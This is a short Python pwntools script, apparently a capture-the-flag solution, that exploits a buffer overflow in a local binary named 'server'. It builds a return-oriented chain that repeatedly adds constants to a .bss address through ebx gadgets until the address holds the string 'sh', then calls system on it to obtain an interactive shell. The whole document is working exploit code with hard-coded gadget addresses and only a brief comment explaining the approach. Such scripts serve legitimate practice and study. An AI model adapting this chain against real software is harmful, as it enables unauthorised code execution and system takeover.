'''
instead of libc leak and calling system,
system is already present in binary,
with ability to pop_ebx and then change the dword ptr [ebx] incrementally,
can write 'sh' to the .bss section and call system
'''

from pwn import *
import time

pwn = process("./server")

system = p32(0x08048420)
where = p32(0x0804a080) # what = 0x6873
junk = b'\x41' * 0x3c
filler = b'\x42\x42\x42\x42'
pop_ebx = p32(0x080483c9)
add_ebx_0x7a = p32(0x08048bb6) # add dword ptr [ebx], 0x7a; ret;
add_ebx_0x3 = p32(0x08048bda) # add dword ptr [ebx]cmpsb byte ptr [esi], byte ptr es:[edi]; add ebp, eax; ret;
add_ebx_0x2 = p32(0x08048b4a) # add dword ptr [ebx], 2; xchg ebp, eax; ret;

buf = junk
buf += pop_ebx
buf += where
buf += add_ebx_0x7a * 219
buf += add_ebx_0x3
buf += add_ebx_0x2 * 9
buf += system
buf += filler
buf += where

pwn.send(buf)

pwn.interactive()
